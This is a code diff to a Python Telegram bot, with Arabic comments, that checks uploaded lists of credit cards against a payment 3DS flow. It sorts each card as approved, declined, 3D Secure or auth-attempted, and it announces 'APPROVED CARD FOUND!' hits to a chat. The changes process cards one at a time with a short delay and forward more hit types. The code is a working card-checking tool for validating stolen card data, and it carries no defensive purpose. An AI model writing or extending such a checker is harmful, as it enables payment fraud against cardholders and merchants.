@@ -42,8 +42,9 @@ stats = {
     'is_running': False,
     'dashboard_message_id': None,
     'chat_id': None,
-    'current_cards': [],
+    'current_card': '',
     'error_details': {},
+    'last_response': 'Waiting...',
 }
 
 # ========== دالات مساعدة ==========
@@ -98,6 +99,7 @@ async def check_card(card, bot_app):
         stats['errors'] += 1
         stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
         stats['checking'] -= 1
+        stats['last_response'] = 'Format Error'
         await update_dashboard(bot_app)
         await send_result(bot_app, card, "ERROR", "صيغة خاطئة")
         return card, "ERROR", "صيغة خاطئة"
@@ -111,6 +113,7 @@ async def check_card(card, bot_app):
         stats['errors'] += 1
         stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
         stats['checking'] -= 1
+        stats['last_response'] = 'Setup Error'
         await update_dashboard(bot_app)
         await send_result(bot_app, card, "ERROR", "فشل Setup Secret")
         session.close()
@@ -165,6 +168,7 @@ async def check_card(card, bot_app):
             if trans_status == 'N':
                 stats['approved'] += 1
                 stats['checking'] -= 1
+                stats['last_response'] = 'N - Approved ✅'
                 await update_dashboard(bot_app)
                 await send_result(bot_app, card, "APPROVED", "Approved ✅")
                 session.close()
@@ -172,6 +176,7 @@ async def check_card(card, bot_app):
             elif trans_status == 'R':
                 stats['rejected'] += 1
                 stats['checking'] -= 1
+                stats['last_response'] = 'R - Declined ❌'
                 await update_dashboard(bot_app)
                 await send_result(bot_app, card, "REJECTED", "Card Declined")
                 session.close()
@@ -179,6 +184,7 @@ async def check_card(card, bot_app):
             elif trans_status == 'C':
                 stats['secure_3d'] += 1
                 stats['checking'] -= 1
+                stats['last_response'] = 'C - 3D Secure ⚠️'
                 await update_dashboard(bot_app)
                 await send_result(bot_app, card, "3D_SECURE", "3D Secure Challenge")
                 session.close()
@@ -186,6 +192,7 @@ async def check_card(card, bot_app):
             elif trans_status == 'A':
                 stats['auth_attempted'] += 1
                 stats['checking'] -= 1
+                stats['last_response'] = 'A - Auth Attempted 🔄'
                 await update_dashboard(bot_app)
                 await send_result(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
                 session.close()
@@ -194,6 +201,7 @@ async def check_card(card, bot_app):
                 stats['errors'] += 1
                 stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
                 stats['checking'] -= 1
+                stats['last_response'] = f'Status: {trans_status}'
                 await update_dashboard(bot_app)
                 await send_result(bot_app, card, "UNKNOWN", f"Status: {trans_status}")
                 session.close()
@@ -202,6 +210,7 @@ async def check_card(card, bot_app):
             stats['errors'] += 1
             stats['error_details']['NO_3DS'] = stats['error_details'].get('NO_3DS', 0) + 1
             stats['checking'] -= 1
+            stats['last_response'] = 'No 3DS Action'
             await update_dashboard(bot_app)
             await send_result(bot_app, card, "ERROR", "No 3DS Action")
             session.close()
@@ -211,6 +220,7 @@ async def check_card(card, bot_app):
         stats['errors'] += 1
         stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
         stats['checking'] -= 1
+        stats['last_response'] = f'Error: {str(e)[:20]}'
         await update_dashboard(bot_app)
         await send_result(bot_app, card, "EXCEPTION", str(e)[:30])
         session.close()
@@ -244,11 +254,19 @@ async def send_result(bot_app, card, status_type, message):
         [InlineKeyboardButton(f"⏰ {datetime.now().strftime('%H:%M:%S')}", callback_data="time_info")]
     ]
     
-    if status_type == 'APPROVED':
+    # إرسال APPROVED و AUTH_ATTEMPTED و 3D_SECURE
+    if status_type in ['APPROVED', 'AUTH_ATTEMPTED', '3D_SECURE']:
         try:
+            if status_type == 'APPROVED':
+                text = f"🎉 **APPROVED CARD FOUND!**"
+            elif status_type == 'AUTH_ATTEMPTED':
+                text = f"🔄 **AUTH ATTEMPTED CARD!**"
+            else:
+                text = f"⚠️ **3D SECURE CARD!**"
+            
             await bot_app.bot.send_message(
                 chat_id=stats['chat_id'],
-                text=f"🎉 **APPROVED CARD FOUND!**",
+                text=text,
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode='Markdown'
             )
@@ -279,16 +297,18 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
+        ],
+        [
+            InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
         ]
     ]
     
     if stats['is_running']:
         keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
     
-    if stats['current_cards']:
-        keyboard.append([InlineKeyboardButton("━━━ البطاقات الحالية ━━━", callback_data="separator")])
-        for i, card_info in enumerate(stats['current_cards'][:3]):
-            keyboard.append([InlineKeyboardButton(f"🔄 {card_info}", callback_data=f"card_{i}")])
+    if stats['current_card']:
+        keyboard.append([InlineKeyboardButton("━━━ البطاقة الحالية ━━━", callback_data="separator")])
+        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
     
     if stats['error_details']:
         keyboard.append([InlineKeyboardButton("━━━ أكثر الأخطاء ━━━", callback_data="error_sep")])
@@ -345,8 +365,9 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats['secure_3d'] = 0
     stats['auth_attempted'] = 0
     stats['errors'] = 0
-    stats['current_cards'] = []
+    stats['current_card'] = ''
     stats['error_details'] = {}
+    stats['last_response'] = 'Starting...'
     stats['start_time'] = datetime.now()
     stats['is_running'] = True
     stats['chat_id'] = update.effective_chat.id
@@ -367,24 +388,24 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     threading.Thread(target=run_checker, daemon=True).start()
 
 async def process_cards(cards, bot_app):
-    for i in range(0, len(cards), 3):
+    for card in cards:
         if not stats['is_running']:
             break
         
-        batch = cards[i:i+3]
-        stats['checking'] = len(batch)
-        stats['current_cards'] = [f"{c.split('|')[0][:6]}****{c.split('|')[0][-4:]}" for c in batch if '|' in c]
+        stats['checking'] = 1
+        parts = card.split('|')
+        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
         await update_dashboard(bot_app)
         
-        tasks = [check_card(card, bot_app) for card in batch]
-        await asyncio.gather(*tasks)
+        await check_card(card, bot_app)
         
-        if i + 3 < len(cards):
-            await asyncio.sleep(2)
+        # تأخير ثانية واحدة فقط
+        await asyncio.sleep(1)
     
     stats['is_running'] = False
     stats['checking'] = 0
-    stats['current_cards'] = []
+    stats['current_card'] = ''
+    stats['last_response'] = 'Completed ✅'
     await update_dashboard(bot_app)
     
     if stats['chat_id']:
